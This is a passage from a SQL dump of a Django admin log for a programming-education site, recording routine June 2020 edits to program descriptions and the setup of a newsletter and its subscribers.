08:21:37.103129','928','Program object (928)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(629,'2020-06-04 08:22:44.100246','929','Program object (929)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(630,'2020-06-04 08:22:47.864931','809','Program object (809)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(631,'2020-06-04 08:23:34.506334','810','Program object (810)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(632,'2020-06-04 08:23:53.311816','930','Program object (930)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(633,'2020-06-04 08:24:59.355490','931','Program object (931)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(634,'2020-06-04 08:25:11.736304','811','Program object (811)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(635,'2020-06-04 08:26:06.982203','932','Program object (932)',2,'[{\"changed\": {\"fields\": [\"Program title\", \"Program description\", \"Explanation\"]}}]',10,1),(636,'2020-06-04 08:26:15.460307','812','Program object (812)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(637,'2020-06-04 08:27:10.714507','933','Program object (933)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(638,'2020-06-04 08:27:42.336195','813','Program object (813)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(639,'2020-06-04 08:27:50.598964','934','Program object (934)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(640,'2020-06-04 08:28:36.803997','935','Program object (935)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(641,'2020-06-04 08:28:41.553052','814','Program object (814)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(642,'2020-06-04 08:30:10.404539','936','Program object (936)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(643,'2020-06-04 08:30:22.027288','815','Program object (815)',2,'[{\"changed\": {\"fields\": [\"Program title\", \"Program description\", \"Explanation\"]}}]',10,1),(644,'2020-06-04 08:30:22.082089','815','Program object (815)',2,'[{\"changed\": {\"fields\": [\"Program title\", \"Program description\", \"Explanation\"]}}]',10,1),(645,'2020-06-04 08:30:59.565030','936','Program object (936)',2,'[]',10,1),(646,'2020-06-04 08:31:50.161547','816','Program object (816)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(647,'2020-06-04 08:32:25.959367','817','Program object (817)',2,'[]',10,1),(648,'2020-06-04 08:32:26.006167','817','Program object (817)',2,'[]',10,1),(649,'2020-06-04 08:32:37.309808','934','Program object (934)',2,'[]',10,1),(650,'2020-06-04 08:32:51.125532','818','Program object (818)',2,'[]',10,1),(651,'2020-06-04 08:32:51.154132','818','Program object (818)',2,'[]',10,1),(652,'2020-06-04 08:33:15.382481','819','Program object (819)',2,'[]',10,1),(653,'2020-06-04 08:33:15.426483','819','Program object (819)',2,'[]',10,1),(654,'2020-06-04 08:33:36.904803','819','Program object (819)',2,'[]',10,1),(655,'2020-06-04 08:34:14.698779','937','Program object (937)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(656,'2020-06-04 08:34:15.683395','820','Program object (820)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',10,1),(657,'2020-06-04 08:35:18.138036','938','Program object (938)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(658,'2020-06-04 08:35:29.244674','821','Program object (821)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',10,1),(659,'2020-06-04 08:36:29.951889','938','Program object (938)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(660,'2020-06-04 08:36:32.118358','822','Program object (822)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(661,'2020-06-04 08:37:04.543329','867','Program object (867)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',10,1),(662,'2020-06-04 08:38:11.238480','939','Program object (939)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(663,'2020-06-04 08:38:23.933360','985','Program object (985)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(664,'2020-06-04 08:38:23.948960','985','Program object (985)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(665,'2020-06-04 08:39:39.050707','940','Program object (940)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(666,'2020-06-04 08:39:39.096908','940','Program object (940)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(667,'2020-06-04 08:40:19.657420','986','Program object (986)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(668,'2020-06-04 08:40:45.445844','941','Program object (941)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(669,'2020-06-04 08:41:46.130898','942','Program object (942)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(670,'2020-06-04 08:41:56.700777','987','Program object (987)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(671,'2020-06-04 08:42:44.381913','943','Program object (943)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(672,'2020-06-04 08:43:05.257906','988','Program object (988)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(673,'2020-06-04 08:43:48.704898','944','Program object (944)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(674,'2020-06-04 08:44:27.490382','989','Program object (989)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(675,'2020-06-04 08:44:46.182724','945','Program object (945)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(676,'2020-06-04 08:45:38.050507','946','Program object (946)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(677,'2020-06-04 08:45:55.469208','990','Program object (990)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(678,'2020-06-04 08:46:47.547300','947','Program object (947)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(679,'2020-06-04 08:47:38.925324','991','Program object (991)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(680,'2020-06-04 08:49:32.976331','948','Program object (948)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(681,'2020-06-04 08:49:40.713622','992','Program object (992)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(682,'2020-06-04 08:50:38.740881','949','Program object (949)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(683,'2020-06-04 08:51:40.274389','950','Program object (950)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(684,'2020-06-04 08:52:06.908590','993','Program object (993)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(685,'2020-06-04 08:53:43.226151','951','Program object (951)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(686,'2020-06-04 08:54:00.727834','994','Program object (994)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(687,'2020-06-04 08:55:36.513239','952','Program object (952)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(688,'2020-06-04 08:55:45.137153','995','Program object (995)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(689,'2020-06-04 08:57:00.135247','953','Program object (953)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(690,'2020-06-04 08:57:19.569955','996','Program object (996)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(691,'2020-06-04 08:58:45.064347','997','Program object (997)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(692,'2020-06-04 08:58:45.769754','954','Program object (954)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(693,'2020-06-04 08:58:48.621985','954','Program object (954)',2,'[]',10,1),(694,'2020-06-04 08:59:46.902071','955','Program object (955)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(695,'2020-06-04 09:00:15.439469','998','Program object (998)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(696,'2020-06-04 09:00:48.861712','956','Program object (956)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(697,'2020-06-04 09:01:27.849547','999','Program object (999)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(698,'2020-06-04 09:01:55.453428','957','Program object (957)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(699,'2020-06-04 09:02:44.548255','1000','Program object (1000)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(700,'2020-06-04 09:02:44.645856','1000','Program object (1000)',2,'[]',10,1),(701,'2020-06-04 09:02:56.460746','958','Program object (958)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(702,'2020-06-04 09:03:41.651224','1001','Program object (1001)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(703,'2020-06-04 09:03:42.085249','959','Program object (959)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(704,'2020-06-04 09:04:35.646639','1002','Program object (1002)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(705,'2020-06-04 09:04:36.700700','960','Program object (960)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(706,'2020-06-04 09:05:20.014177','961','Program object (961)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(707,'2020-06-04 09:05:32.845665','1003','Program object (1003)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(708,'2020-06-04 09:06:43.142974','962','Program object (962)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(709,'2020-06-04 09:06:43.153975','962','Program object (962)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(710,'2020-06-04 09:06:45.939294','1004','Program object (1004)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(711,'2020-06-04 09:07:28.736056','1005','Program object (1005)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(712,'2020-06-04 09:07:38.981642','963','Program object (963)',2,'[{\"changed\": {\"fields\": [\"Program title\", \"Program description\", \"Explanation\"]}}]',10,1),(713,'2020-06-04 09:08:17.245830','1006','Program object (1006)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(714,'2020-06-04 09:08:29.771534','964','Program object (964)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(715,'2020-06-04 09:08:29.879540','964','Program object (964)',2,'[]',10,1),(716,'2020-06-04 09:08:53.975716','1007','Program object (1007)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(717,'2020-06-04 09:09:59.647657','1008','Program object (1008)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(718,'2020-06-04 09:10:11.081311','965','Program object (965)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(719,'2020-06-04 09:11:03.828604','1009','Program object (1009)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(720,'2020-06-04 09:12:21.070624','966','Program object (966)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(721,'2020-06-04 09:12:28.590016','1010','Program object (1010)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(722,'2020-06-04 09:13:20.990508','1011','Program object (1011)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(723,'2020-06-04 09:13:30.246184','967','Program object (967)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(724,'2020-06-04 09:13:51.089535','1012','Program object (1012)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(725,'2020-06-04 09:14:31.380598','1013','Program object (1013)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(726,'2020-06-04 09:14:58.192291','1010','Program object (1010)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(727,'2020-06-04 09:15:11.903235','968','Program object (968)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(728,'2020-06-04 09:15:23.121876','1011','Program object (1011)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(729,'2020-06-04 09:15:36.227384','1012','Program object (1012)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(730,'2020-06-04 09:15:36.267387','1012','Program object (1012)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(731,'2020-06-04 09:16:20.160617','969','Program object (969)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(732,'2020-06-04 09:16:50.024286','1014','Program object (1014)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(733,'2020-06-04 09:17:10.593919','970','Program object (970)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(734,'2020-06-04 09:17:50.779424','1015','Program object (1015)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(735,'2020-06-04 09:17:50.824426','1015','Program object (1015)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(736,'2020-06-04 09:18:21.629947','971','Program object (971)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(737,'2020-06-04 09:19:19.105316','972','Program object (972)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(738,'2020-06-04 09:19:19.401716','1016','Program object (1016)',2,'[{\"changed\": {\"fields\": [\"Program title\", \"Program description\", \"Explanation\"]}}]',10,1),(739,'2020-06-04 09:20:32.572457','1017','Program object (1017)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(740,'2020-06-04 09:20:49.260170','973','Program object (973)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(741,'2020-06-04 09:21:38.875124','1018','Program object (1018)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(742,'2020-06-04 09:22:19.963754','974','Program object (974)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(743,'2020-06-04 09:22:56.206969','1019','Program object (1019)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(744,'2020-06-04 09:23:40.311767','975','Program object (975)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(745,'2020-06-04 09:25:33.636679','1020','Program object (1020)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(746,'2020-06-04 09:26:54.350606','1021','Program object (1021)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(747,'2020-06-04 09:26:57.918810','976','Program object (976)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(748,'2020-06-04 09:28:15.088072','1022','Program object (1022)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(749,'2020-06-04 09:28:39.483959','977','Program object (977)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(750,'2020-06-04 09:29:45.614051','1023','Program object (1023)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(751,'2020-06-04 09:30:21.028473','978','Program object (978)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(752,'2020-06-04 09:30:36.536158','979','Program object (979)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',10,1),(753,'2020-06-04 09:31:16.224785','1024','Program object (1024)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(754,'2020-06-04 09:31:28.090464','982','Program object (982)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',10,1),(755,'2020-06-04 09:31:57.724517','983','Program object (983)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',10,1),(756,'2020-06-04 09:32:27.953732','984','Program object (984)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',10,1),(757,'2020-06-04 09:32:55.835266','1025','Program object (1025)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(758,'2020-06-04 09:34:19.068122','823','Program object (823)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(759,'2020-06-04 09:34:33.451944','1026','Program object (1026)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(760,'2020-06-04 09:35:39.953670','1027','Program object (1027)',2,'[{\"changed\": {\"fields\": [\"Program title\", \"Program description\", \"Explanation\"]}}]',10,1),(761,'2020-06-04 09:36:40.422197','824','Program object (824)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(762,'2020-06-04 09:36:49.900739','1028','Program object (1028)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(763,'2020-06-04 09:37:11.799095','825','Program object (825)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(764,'2020-06-04 09:37:37.886139','1029','Program object (1029)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(765,'2020-06-04 09:37:44.574521','826','Program object (826)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(766,'2020-06-04 09:38:22.519049','1030','Program object (1030)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(767,'2020-06-04 09:38:29.352203','827','Program object (827)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(768,'2020-06-04 09:39:05.219414','828','Program object (828)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(769,'2020-06-04 09:39:07.197527','1031','Program object (1031)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(770,'2020-06-04 09:40:04.336786','1032','Program object (1032)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(771,'2020-06-04 09:40:15.411777','829','Program object (829)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(772,'2020-06-04 09:41:02.328576','1033','Program object (1033)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(773,'2020-06-04 09:41:03.891666','830','Program object (830)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(774,'2020-06-04 09:42:13.691537','1034','Program object (1034)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(775,'2020-06-04 09:42:26.142607','831','Program object (831)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(776,'2020-06-04 09:43:00.948955','832','Program object (832)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(777,'2020-06-04 09:43:01.303975','1035','Program object (1035)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(778,'2020-06-04 09:43:43.005503','833','Program object (833)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(779,'2020-06-04 09:44:07.693233','1036','Program object (1036)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(780,'2020-06-04 09:44:18.644605','834','Program object (834)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(781,'2020-06-04 09:44:58.120936','1037','Program object (1037)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(782,'2020-06-04 09:45:19.819177','835','Program object (835)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(783,'2020-06-04 09:45:50.338487','1038','Program object (1038)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(784,'2020-06-04 09:46:24.574807','836','Program object (836)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(785,'2020-06-04 09:46:47.554122','1039','Program object (1039)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(786,'2020-06-04 09:47:05.517515','837','Program object (837)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(787,'2020-06-04 09:47:38.829136','1040','Program object (1040)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(788,'2020-06-04 09:47:40.586236','838','Program object (838)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(789,'2020-06-04 09:48:13.598495','839','Program object (839)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(790,'2020-06-04 09:48:38.691504','1041','Program object (1041)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(791,'2020-06-04 09:48:47.546794','840','Program object (840)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(792,'2020-06-04 09:49:19.504187','841','Program object (841)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(793,'2020-06-04 09:50:07.353686','1042','Program object (1042)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(794,'2020-06-04 09:50:16.181191','842','Program object (842)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(795,'2020-06-04 09:50:52.839439','1043','Program object (1043)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(796,'2020-06-04 09:50:57.690716','843','Program object (843)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(797,'2020-06-04 09:51:34.218775','1044','Program object (1044)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(798,'2020-06-04 09:51:43.960332','844','Program object (844)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(799,'2020-06-04 09:52:07.170000','1045','Program object (1045)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(800,'2020-06-04 09:52:32.999460','845','Program object (845)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(801,'2020-06-04 09:52:51.793651','1046','Program object (1046)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(802,'2020-06-04 09:53:16.889423','846','Program object (846)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(803,'2020-06-04 09:53:38.218406','1047','Program object (1047)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(804,'2020-06-04 09:54:06.589998','847','Program object (847)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(805,'2020-06-04 09:54:26.864123','1048','Program object (1048)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(806,'2020-06-04 09:54:51.428295','848','Program object (848)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(807,'2020-06-04 09:54:51.537500','848','Program object (848)',2,'[]',10,1),(808,'2020-06-04 09:55:34.408322','1049','Program object (1049)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(809,'2020-06-04 09:55:37.774515','849','Program object (849)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(810,'2020-06-04 09:56:29.551605','1050','Program object (1050)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(811,'2020-06-04 09:56:30.446657','850','Program object (850)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(812,'2020-06-04 09:57:29.404908','1051','Program object (1051)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(813,'2020-06-04 09:57:45.969855','851','Program object (851)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(814,'2020-06-04 09:58:23.835676','852','Program object (852)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(815,'2020-06-04 09:58:35.841362','1052','Program object (1052)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(816,'2020-06-04 09:59:04.547349','853','Program object (853)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(817,'2020-06-04 09:59:09.651641','1053','Program object (1053)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(818,'2020-06-04 09:59:43.179476','1054','Program object (1054)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(819,'2020-06-04 09:59:51.222936','854','Program object (854)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(820,'2020-06-04 10:00:37.281286','855','Program object (855)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(821,'2020-06-04 10:01:07.978399','866','Program object (866)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(822,'2020-06-04 10:01:19.085035','856','Program object (856)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(823,'2020-06-04 10:01:44.922870','865','Program object (865)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(824,'2020-06-04 10:01:58.562409','857','Program object (857)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(825,'2020-06-04 10:02:19.050076','864','Program object (864)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(826,'2020-06-04 10:02:44.285476','858','Program object (858)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(827,'2020-06-04 10:02:53.969030','863','Program object (863)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(828,'2020-06-04 10:03:19.966275','859','Program object (859)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(829,'2020-06-04 10:03:40.037177','862','Program object (862)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(830,'2020-06-04 10:03:54.704016','860','Program object (860)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(831,'2020-06-04 10:04:13.536460','861','Program object (861)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(832,'2020-06-04 11:38:15.348753','2','decodeschool.com',1,'[{\"added\": {}}]',14,1),(833,'2020-06-04 11:40:20.878933','1','Programs & Posts',1,'[{\"added\": {}}]',18,1),(834,'2020-06-04 11:42:34.832970','1','C Problem Solving in Programs & Posts',1,'[{\"added\": {}}, {\"added\": {\"name\": \"article\", \"object\": \"Programs\"}}, {\"added\": {\"name\": \"article\", \"object\": \"Posts\"}}]',17,1),(835,'2020-06-04 11:43:08.594901','1','letters4ramesh@gmail.com to Programs & Posts',1,'[{\"added\": {}}]',20,1),(836,'2020-06-04 11:43:46.706081','1','C Problem Solving in Programs & Posts on 2020-06-04 11:43:34+00:00',1,'[{\"added\": {}}]',19,1),(837,'2020-06-04 11:47:49.474966','1','Programs & Posts',2,'[{\"changed\": {\"fields\": [\"E-mail\"]}}]',18,1),(838,'2020-06-04 13:13:56.975816','4','madhan to Programs & Posts',3,'',20,1),(839,'2020-06-05 09:00:49.263819','1','C Problem Solving in Programs & Posts on 2020-06-04 11:43:34+00:00',3,'',19,1),(840,'2020-06-05 09:01:56.516236','2','C Problem Solving in Programs & Posts on 2020-06-05 09:01:04+00:00',1,'[{\"added\": {}}]',19,1),(841,'2020-06-05 09:44:54.085812','2','C Problem Solving in Programs & Posts on 2020-06-05 09:01:04+00:00',3,'',19,1),(842,'2020-06-05 09:45:20.397195','3','C Problem Solving in Programs & Posts on 2020-06-05 09:44:58+00:00',1,'[{\"added\": {}}]',19,1),(843,'2020-06-05 15:19:03.413540','1','Programs & Posts',2,'[{\"changed\": {\"fields\": [\"email\"]}}]',18,1),(844,'2020-06-05 15:19:50.432302','3','decodeschool.myboon.org',1,'[{\"added\": {}}]',14,1),(845,'2020-06-05 15:19:59.512545','1','Programs & Posts',2,'[{\"changed\": {\"fields\": [\"site\"]}}]',18,1),(846,'2020-06-05 15:23:14.380523','3','C Problem Solving in Programs & Posts on 2020-06-05 09:44:58+00:00',3,'',19,1),(847,'2020-06-05 15:26:46.036748','4','C Problem Solving in Programs & Posts on 2020-06-05 15:23:32+00:00',1,'[{\"added\": {}}]',19,1),(848,'2020-06-06 05:14:05.401981','2','Input and Output in 